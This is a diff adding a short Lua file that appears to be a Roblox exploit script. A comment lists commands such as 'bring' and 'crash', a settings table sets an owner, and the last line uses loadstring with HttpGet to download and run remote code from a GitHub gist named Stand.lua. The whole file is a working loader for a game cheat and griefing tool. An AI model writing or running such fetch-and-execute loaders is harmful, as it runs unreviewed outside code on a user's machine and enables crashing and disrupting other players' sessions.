@@ -1,0 +1,13 @@
+--[[
+    Commands :
+    -bring
+    -crash
+    -stop
+    -summon
+]]
+
+getgenv().Settings = {
+    Owner = "Roblox"
+}
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Pi-314Git/a3d763e11ee35873fce4665065236e59/raw/542af2ddba378b75d5513d1107a48c2f9f52d643/Stand.lua"))()
